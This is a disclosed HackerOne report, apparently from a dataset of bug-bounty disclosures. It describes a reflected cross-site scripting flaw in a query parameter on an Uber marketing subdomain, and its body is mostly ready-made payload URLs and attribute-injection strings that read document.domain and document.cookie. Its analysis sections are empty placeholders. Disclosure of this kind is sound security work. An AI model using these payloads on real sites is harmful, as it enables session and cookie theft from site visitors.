---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '156098'
original_report_id: '156098'
title: XSS At "pages.et.uber.com"
weakness: Cross-site Scripting (XSS) - Generic
team_handle: uber
created_at: '2016-08-02T14:23:50.067Z'
disclosed_at: '2016-08-19T17:32:23.081Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 227
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS At "pages.et.uber.com"

## Metadata

- HackerOne Report ID: 156098
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: uber
- Disclosed At: 2016-08-19T17:32:23.081Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

Vulnerable Domain :
-------------------
https://pages.et.uber.com/

Vulnerable Link :
-----------------
https://pages.et.uber.com/icecream/?lang_id=5


Edited Link With Payload :
--------------------------
https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.domain)%20bad%3d%22
https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.cookie)%20bad%3d%22
https://pages.et.uber.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(9020)%20bad%3d%22


Payload Used :
--------------

" onmouseover%3dprompt(9020) bad%3d"
" onmouseover%3dprompt(document.domain) bad%3d"
" onmouseover%3dprompt(document.cookie) bad%3d"

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
